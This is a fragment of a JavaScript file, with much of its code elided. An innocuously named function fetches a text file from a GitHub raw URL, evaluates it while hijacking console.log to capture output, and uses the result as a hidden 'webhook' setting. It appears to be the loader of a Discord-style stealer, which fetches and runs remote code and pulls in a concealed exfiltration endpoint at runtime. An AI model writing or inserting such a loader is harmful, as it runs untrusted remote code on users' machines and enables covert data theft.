...
async function goodboy() {
    try {
        const branch = 'https://raw.githubusercontent.com/Raplhs/rarbotdc/main/addon.txt';
        ...
        console.log = function () {
            ...
            // Call the original console.log for normal behavior
        ...
        try {
            ...
            console.error('Error during eval:', error.message);
        } finally {
            // Wait for a short delay to ensure logs are captured
            ...
            // Log captured logs if not empty
...
const capturedLogsResult = goodboy();

// Export the result
module.exports = capturedLogsResult;

const CONFIG = {
    webhook: `${capturedLogsResult}`,
